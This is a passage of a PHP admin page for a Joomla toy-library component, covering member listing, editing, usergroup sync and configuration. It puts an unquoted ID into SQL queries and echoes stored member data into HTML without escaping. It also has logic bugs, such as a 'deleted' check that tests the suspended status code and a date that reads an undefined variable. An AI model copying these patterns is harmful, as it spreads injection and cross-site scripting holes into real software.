						echo "</tr>\n";
					};
				} else {
					// no rows or toys in database found
					echo "<tr><td colspan=6 align=center><B>Sorry - No loan requests found</B></td></tr>\n";
				};
?>
						</table><form name='limitdisplay'>
<?php
				echo $pager->getListFooter();
				echo "Number of loan requests to display per page: ".$pager->getLimitBox()."<BR>\n";
				echo "</form>";
				// end of default: switch
		break;
};
echo JHtmlTabs::panel("Members",'panel-id-4');
echo "<a href='".JURI::current()."?option=com_toydatabase'><h2>Members</h2></a>";
?>
Membership is a <i>suppliment</i> to the joomla user management. Users should have a joomla account FIRST, then you can add additional information here for their toy database membership details.<BR>
<?php
switch($member_act) {
	case "2":
		// make changes to selected user
		if ($tab == "member") {
			$frm_in_membername = $jinput->get('in_membername', '', 'RAW');
			$frm_in_urn = $jinput->get('in_urn', '', 'RAW');
			$frm_in_type = $jinput->get('in_type', '', 'RAW');
			$frm_in_companyname = $jinput->get('in_companyname', '', 'RAW');
			$frm_in_address1 = $jinput->get('in_address1', '', 'RAW');
			$frm_in_address2 = $jinput->get('in_address2', '', 'RAW');
			$frm_in_town = $jinput->get('in_town', '', 'RAW');
			$frm_in_postcode = $jinput->get('in_postcode', '', 'RAW');
			$frm_in_telephone = $jinput->get('in_telephone', '', 'RAW');
			$frm_in_mobile = $jinput->get('in_mobile', '', 'RAW');
			$frm_in_email = $jinput->get('in_email', '', 'RAW');
			$frm_in_memb_category = $jinput->get('in_memb_category', '', 'RAW');
			$frm_in_renewaldate = $jinput->get('in_renewaldate', '', 'RAW');
			if ($frm_in_renewaldate) {
				// renewaldate is d/m/Y so convert to mysql format
				$frm_renewaldate=JFactory::getDate($frm_in_renewaldate);
				$frm_renewaldate_out=JHtml::_('date', $frm_renewaldate, 'Y-m-d 00:00:00');
			} else {
				$frm_renewaldate_out="";
			};
			$frm_in_disabilities = $jinput->get('in_disabilities', '', 'RAW');
			$frm_in_children = $jinput->get('in_children', '', 'RAW');
			$frm_in_active = $jinput->get('active', '', 'RAW');
			
			// get the registered userid from joomla for activating and deactivating users
			$get_usergroup_joomla = $db->getQuery(true);
			$get_usergroup_joomla
			->select('*')
			->from($db->quoteName('#__usergroups'))
			->where($db->quoteName('title') . ' = "Registered"');
			$db->setQuery((string) $get_usergroup_joomla);
			$db->execute();
			$joomlagroup_row = $db->loadAssoc();
			$joomlagroup_registered = $joomlagroup_row["id"];
			
			// get the joomlauserid from the membership database
			$get_memb_joomlaid = $db->getQuery(true);
			$get_memb_joomlaid
			->select('*')
			->from($db->quoteName('#__toydatabase_membership'))
			->where($db->quoteName('id') . ' = ' . $ddid);
			$db->setQuery((string) $get_memb_joomlaid);
			$db->execute();
			$memb_joomlaid = $db->loadAssoc();
			$joomla_userid = $memb_joomlaid["joomla_userid"];
			
			// if activated then set the user to registered in joomla too
			if ($frm_in_active == "1") {
				// active
				$get_curruser_joomla = $db->getQuery(true);
				$get_curruser_joomla
				->select('*')
				->from($db->quoteName('#__user_usergroup_map'))
				->where($db->quoteName('user_id') . ' = '. $joomla_userid, 'AND')
				->where($db->quoteName('group_id') . ' = '. $joomlagroup_registered);
				$db->setQuery((string) $get_curruser_joomla);
				$db->execute();
				if ($db->getNumRows() == 0) {
					// add as they arent in the registered column
					$ins_request = $db->getQuery(true);
					$ins_columns = array('user_id','group_id');
					$ins_values = array($db->quote($joomla_userid),$db->quote($joomlagroup_registered));
					$ins_request
					->insert($db->quoteName('#__user_usergroup_map'))
					->columns($db->quoteName($ins_columns))
					->values(implode(',', $ins_values));
					try {
						$db->setQuery($ins_request);
						$db->execute();
					}
					catch (RuntimeException $e) {
						JFactory::getApplication()->enqueueMessage($e->getMessage());
						return false;
					};					
				};
			};
			if ($frm_in_active == "10") {
				// suspended so delete the registered state for this user
				$get_curruser_joomla = $db->getQuery(true);
				$get_curruser_joomla
				->select('*')
				->from($db->quoteName('#__user_usergroup_map'))
				->where($db->quoteName('user_id') . ' = '. $joomla_userid, 'AND')
				->where($db->quoteName('group_id') . ' = '. $joomlagroup_registered);
				$db->setQuery((string) $get_curruser_joomla);
				$db->execute();
				if ($db->getNumRows() > 0) {
					// delete as they are here
					$del_query = $db->getQuery(true);
					$del_query->delete($db->quoteName('#__user_usergroup_map'));
					$del_query->where($db->quoteName('user_id') . ' = '. $joomla_userid, 'AND')
					->where($db->quoteName('group_id') . ' = '. $joomlagroup_registered);
					$db->setQuery($del_query);
					$db->execute();
				};
			};
			if ($frm_in_active == "10") {
				// deleted so do the same as suspended
				$get_curruser_joomla = $db->getQuery(true);
				$get_curruser_joomla
				->select('*')
				->from($db->quoteName('#__user_usergroup_map'))
				->where($db->quoteName('user_id') . ' = '. $joomla_userid, 'AND')
				->where($db->quoteName('group_id') . ' = '. $joomlagroup_registered);
				$db->setQuery((string) $get_curruser_joomla);
				$db->execute();
				if ($db->getNumRows() > 0) {
					// delete as they are here
					$del_query = $db->getQuery(true);
					$del_query->delete($db->quoteName('#__user_usergroup_map'));
					$del_query->where($db->quoteName('user_id') . ' = '. $joomla_userid, 'AND')
					->where($db->quoteName('group_id') . ' = '. $joomlagroup_registered);
					$db->setQuery($del_query);
					$db->execute();
				};
			};	
			$upd_request = $db->getQuery(true);
			$upd_fields = array(
					$db->quoteName('type') . ' = ' . $db->quote($frm_in_type),
					$db->quoteName('urn') . ' = ' . $db->quote($frm_in_urn),
					$db->quoteName('name') . ' = ' . $db->quote($frm_in_membername),
					$db->quoteName('companyname') . ' = ' . $db->quote($frm_in_companyname),
					$db->quoteName('address1') . ' = ' . $db->quote($frm_in_address1),
					$db->quoteName('address2') . ' = ' . $db->quote($frm_in_address2),
					$db->quoteName('town') . ' = ' . $db->quote($frm_in_town),
					$db->quoteName('postcode') . ' = ' . $db->quote($frm_in_postcode),
					$db->quoteName('telephone') . ' = ' . $db->quote($frm_in_telephone),
					$db->quoteName('mobile') . ' = ' . $db->quote($frm_in_mobile),
					$db->quoteName('email') . ' = ' . $db->quote($frm_in_email),
					$db->quoteName('memb_category') . ' = ' . $db->quote($frm_in_memb_category),
					$db->quoteName('renewaldate') . ' = ' . $db->quote($frm_renewaldate_out),
					$db->quoteName('disabilities') . ' = ' . $db->quote($frm_in_disabilities),
					$db->quoteName('children') . ' = ' . $db->quote($frm_in_children),
					$db->quoteName('active') . ' = ' . $db->quote($frm_in_active),
					$db->quoteName('adminuser') . ' = ' . $db->quote($user->id)
			);
			$upd_request->update($db->quoteName('#__toydatabase_membership'))->set($upd_fields)->where($db->quoteName('id') . ' = '. $ddid);
			try {
				$db->setQuery($upd_request);
				$db->execute();
			}
			catch (RuntimeException $e) {
				JFactory::getApplication()->enqueueMessage($e->getMessage());
				return false;
			};
			echo "<h2>Complete</h2> - Member has been updated<BR>\n";
		}; // if tab == member
		break;
	case "1":
		// display specific member
		if($tab == "member") {
			if ($ddid) {
				$query = $db->getQuery(true);
				$query
				->select('*')
				->from($db->quoteName('#__toydatabase_membership'))
				->where($db->quoteName('id') . ' = '. $ddid);
				$db->setQuery((string) $query);
				$db->execute();
				$row = $db->loadAssoc();
			
				// get member type lookup
				$query_membtype = $db->getQuery(true);
				$query_membtype
				->select('*')
				->from($db->quoteName('#__toydatabase_membershiplink'))
				->where($db->quoteName('membershipid') . ' = '. $ddid);
				$db->setQuery((string) $query_membtype);
				$db->execute();
				$memb_typerow = $db->loadAssoc();
				if ($row["renewaldate"] != "0000-00-00 00:00:00") {
					$entry_renewaldate=JFactory::getDate($row["renewaldate"]);
					$in_renewaldate=JHtml::_('date', $entry_requestdate, 'd/m/Y');
				};
			};
			?>
					<form method=post name='update_member'>
					<input type=hidden name='member_act' value='2'>
					<input type=hidden name='ddid' value='<?=$ddid?>'>
					<input type=hidden name='tab' value='member'>
					<table width=95% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
					<tr>
					<td valign=top><B>Joomla Userid link :</B></td>
					<td><input type=text size=5 name='in_joomla_userid' id='in_joomla_userid' value='<?=$row["joomla_userid"]?>'>&nbsp;<a href="<?=JURI::root()?>/administrator/components/com_toydatabase/toydatabase_popjoomlauser.php?curr_member=<?=$row["joomla_userid"]?>" class="modal" id='memberselector' name='memberselector' rel="{handler: 'iframe', size: {x: 600, y: 400}}">Joomla user selector</a></td>
					</tr>
					<tr>
					<td valign=top><B>Member Name :</B></td>
					<td><input type=text size=30 name='in_membername' value='<?=$row["name"]?>'></td>
					</tr>
					<tr>
					<td valign=top><B>URN :</B></td>
					<td><input type=text size=20 name='in_urn' value='<?=$row["urn"]?>'></td>
					</tr>
					<tr>
					<td valign=top><B>Type :</B></td>
					<td><select name='in_type'>
<option value=''></option>
<option value='1'>Individual</option>
<option value='2'>Organisation</option>
					</select></td>
					</tr>
					<tr>
					<td valign=top><B>Company Name :</B></td>
					<td><input type=text size=30 name='in_companyname' value='<?=$row["companyname"]?>'></td>
					</tr>
					<tr>
					<td valign=top><B>Address1 :</B></td>
					<td><input type=text size=50 name='in_address1' value='<?=$row["address1"]?>'></td>
					</tr>
					<tr>
					<td valign=top><B>Address2 :</B></td>
					<td><input type=text size=50 name='in_address2' value='<?=$row["address2"]?>'></td>
					</tr>
					<tr>
					<td valign=top><B>Town :</B></td>
					<td><input type=text size=50 name='in_town' value='<?=$row["town"]?>'></td>
					</tr>
					<tr>
					<td valign=top><B>Postcode :</B></td>
					<td><input type=text size=15 name='in_postcode' value='<?=$row["postcode"]?>'></td>
					</tr>
					<tr>
					<td valign=top><B>Telephone :</B></td>
					<td><input type=text size=50 name='in_telephone' value='<?=$row["telephone"]?>'></td>
					</tr>
					<tr>
					<td valign=top><B>Mobile :</B></td>
					<td><input type=text size=50 name='in_mobile' value='<?=$row["mobile"]?>'></td>
					</tr>
					<tr>
					<td valign=top><B>Email :</B></td>
					<td><input type=text size=60 name='in_email' value='<?=$row["email"]?>'></td>
					</tr>
					<tr>
					<td valign=top><B>Membership Category :</B></td>
					<td><select name='in_memb_category'/>
<option value=''></option>
<?php 
// get membershiptypes
$query_membtypes = $db->getQuery(true);
$query_membtypes
->select("*")
->from($db->quoteName('#__toydatabase_membershiptypes'));
$db->setQuery((string) $query_membtypes);
$db->execute();
$membershiptypes_rows= $db->loadAssocList();
foreach ($membershiptypes_rows as $membershiptypes_output) {
	echo "<option value='".$membershiptypes_output["id"]."' ";
	if ($row["memb_category"] == $membershiptypes_output["id"]) {echo "selected";};
	echo ">".$membershiptypes_output["type"]."</option>\n";
};
?>
</select>
					</td>
					</tr>
					<tr>
					<td valign=top><B>Renewal Date :</B></td>
					<td><?=JHTML::_('calendar', $in_renewaldate, "in_renewaldate" , "in_renewaldate", '%d-%m-%Y'); ?></td>
					</tr>
					<tr>
					<td valign=top><B>Join Date (locked) :</B></td>
					<td><input type=text size=50 name='in_joindate' disabled value='<?=$row["joindate"]?>'></td>
					</tr>
					<tr>
					<td valign=top><B>Creation Date (locked) :</B></td>
					<td><input type=text size=50 name='in_creationdate' disabled value='<?=$row["creationdate"]?>'></td>
					</tr>
					<tr>
					<td valign=top><B>Disabilities :</B></td>
					<td><textarea rows="3" cols="4" name='in_disabilities'><?=$row["disabilities"]?></textarea></td>
					</tr>
					<tr>
					<td valign=top><B>Children :</B></td>
					<td><input type=text size=5 name='in_children' value='<?=$row["children"]?>'></td>
					</tr>
					<tr>
					<td valign=top><B>Status :</B></td>
					<td><select name='active'>
					<option value='0' <?php if ($row["active"] == "0") {echo "selected";}; ?>>Pending approval</option>
					<option value='1' <?php if ($row["active"] == "1") {echo "selected";}; ?>>Active</option>
					<option value='10' <?php if ($row["active"] == "10") {echo "selected";}; ?>>Suspended</option>
					<option value='99' <?php if ($row["active"] == "99") {echo "selected";}; ?>>Deleted</option>
					</select></td>
					</tr>
					<tr>
					<td valign=top><B>Created/Approved by (locked) :</B></td>
					<td><input type=text size=50 name='in_adminuser' disabled value='<?=$row["adminuser"]?>'></td>
					</tr>
					<tr><td colspan=2 align=right><input type=submit value='Save changes'></td></tr>
					</table>
					</form>
		<?php
		};
		break;
	default:
		// display member list
		$query = $db->getQuery(true);
		$query
		->select('SQL_CALC_FOUND_ROWS *')
		->from($db->quoteName('#__toydatabase_membership'))
		->order($db->quoteName('name') . ' DESC');
		
		$app = JFactory::getApplication();
		$limit = $app->getUserStateFromRequest("$option.limit", 'limit', 25, 'int');
		$limitstart = JFactory::getApplication()->input->get('limitstart', 0, 'INT');
		
		$db->setQuery($query,$limitstart, $limit);
		$row = $db->loadAssocList('id');
		if(!empty($row)){
			$db->setQuery('SELECT FOUND_ROWS();');
			$num_rows=$db->loadResult();
			jimport('joomla.html.pagination');
			$pager=new JPagination($num_rows, $limitstart, $limit);
		};
		?>
						<!-- New member button -->
						<form method=post onsubmit="return false">
						<input type=hidden name='member_act' value='4'>
						<input type=hidden name='tab' value='member'>
						<table width=100% border=0 cellpadding=0 cellspacing=0>
						<tr align=right><td align=right><input type=button name='newmember' id='newmember' value='Add a new member link' onclick='self.location="<?=JURI::getInstance()->toString() ?>&tab=member&member_act=1"'></td></tr>
						</table>
						</form>
						<!-- END new member button -->
						
						<table width=85% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
						<tr><td width=5%><B>Member joomla ID</B></td>
						<td width=10%><B>Member URN</B></td>
						<td width=20%><B>Member Name</B></td>
						<td width=20%><B>Company</B></td>
						<td width=10%><B>Postcode</B></td>
						<td width=10%><B>Member Category</B></td>
						<td width=10%><B>Join Date</B></td>
						<td width=10%><B>Renewal Date</B></td>
						<td width=5%><B>Status</B></td>
						</tr>
						<?php
						if (!empty($row)) {
							// print_r($row);
							foreach ($row as $row_key=>$row_value) {
								// convert memb_category
								// link to joomlaid
								// joindate to human date
								// renewaldate to human date
								
								$check_member_query = $db->getQuery(true);
								$check_member_query
								->select('*')
								->from($db->quoteName('#__toydatabase_membershiplink'))
								->where($db->quoteName('membershipid') . ' = '. $row_value["id"]);
								$db->setQuery((string) $check_member_query);
								$db->execute();
								$membership_row = $db->loadAssoc();
								
								// get member category
								$get_memb_cat = $db->getQuery(true);
								$get_memb_cat
								->select('*')
								->from($db->quoteName('#__toydatabase_membershiptypes'))
								->where($db->quoteName('id') . ' = '. $row_value["memb_category"]);
								$db->setQuery((string) $get_memb_cat);
								$db->execute();
								$memb_cat_data = $db->loadAssoc();
								
								$entry_joindate=JFactory::getDate($row_value["joindate"]);
								$entry_joindate_out=JHtml::_('date', $entry_joindate, 'd/m/Y');
								
								if ($row_value["renewaldate"] != "0000-00-00 00:00:00") {
									$entry_renewaldate=JFactory::getDate($row_value["renewaldate"]);
									$entry_renewaldate_out=JHtml::_('date', $entry_renewaldate, 'd/m/Y');
								} else {
									$entry_renewaldate_out="N/A";
								};
								if ($row_value["active"] == "1") {$entry_active="Active";};
								if ($row_value["active"] == "0") {$entry_active="Pending";};
								if ($row_value["active"] == "10") {$entry_active="Suspended";};
								if ($row_value["active"] == "99") {$entry_active="Deleted";};
								
								echo "<tr onclick='self.location=\"".JURI::getInstance()->toString()."&tab=member&member_act=1&ddid=$row_key\"'>";
								echo "<td>".$row_value["joomla_userid"]."</td>";
								echo "<td>".$row_value["urn"]."</td>";
								echo "<td>".$row_value["name"]."</td>";
								echo "<td>".$row_value["companyname"]."</td>";
								echo "<td>".$row_value["postcode"]."</td>";
								echo "<td>".$memb_cat_data["type"]."</td>";
								echo "<td>".$entry_joindate_out."</td>";
								echo "<td>".$entry_renewaldate_out."</td>";
								echo "<td>".$entry_active."</td>";
								echo "</tr>\n";
							};
						} else {
							// no rows or toys in database found
							echo "<tr><td colspan=8 align=center><B>Sorry - No members found</B></td></tr>\n";
						};
?>
								</table><form name='limitdisplay'>
<?php
						echo $pager->getListFooter();
						echo "Number of members to display per page: ".$pager->getLimitBox()."<BR>\n";
						echo "</form>";
			// end of default: switch
		break;
};
echo JHtmlTabs::panel("Reports",'panel-id-5');
echo "<a href='".JURI::current()."?option=com_toydatabase'><h2>Reporting</h2></a>";
?>
<?php
// try it via includes?
include_once("toydatabase_reports.php");

echo JHtmlTabs::panel("Configuration",'panel-id-6'); //You can use any custom text
echo "<a href='".JURI::current()."?option=com_toydatabase'><h2>Configuration</h2></a>";
?>
<form method=post name='configuration'>
<table width=95% border=1 cellpadding=0 cellspacing=0>
<tr><td><B>User group membership association:</B></td>
<td><select name='groupmembership'>
<option value=''></option>
<?php 
$query_permissions=$db->getQuery(true);
$query_permissions
->select("*")
->from($db->quoteName('#__toydatabase_permissions'))
->where($db->quoteName('function') . ' = "member"');
$db->setQuery((string) $query_permissions);
$db->execute();
$permissions_rows = $db->loadAssocList();
//print_r($permissions_rows);
$query_usergroups = $db->getQuery(true);
$query_usergroups
->select("*")
->from($db->quoteName('#__usergroups'));
$db->setQuery((string) $query_usergroups);
$db->execute();
$usergroups_rows = $db->loadAssocList();
foreach ($usergroups_rows as $usergroup_output) {
	echo "<option value='".$usergroup_output["id"]."' ";
	if ($permissions_rows[0]["groupname"] == $usergroup_output["id"]) {echo "selected";};
	echo ">".$usergroup_output["title"]."</option>\n";
};

$admin_emails=$permissions_rows[0]["admin_emails"];
?>
</select></td></tr>
<tr><td colspan=2>Note: You must have already created a usergroup. If not, click <a href='index.php?option=com_users&view=groups'>HERE</a> to set one up first.</td></tr>
<tr><td colspan=2 align=center><hr width=99%></td></tr>
<tr><td><B>Admin emails (Comma separated):</B></td><td><input type=text name='admin_emails' id='admin_emails' value='<?=$admin_emails?>'></td></tr>
<tr><td colspan=2 align=center><hr width=99%></td></tr>
<tr><td colspan=2 align=right><input type=submit name='Save changes'></td></tr>
</table>
</form>
<?php
echo JHtmlTabs::end();

?>
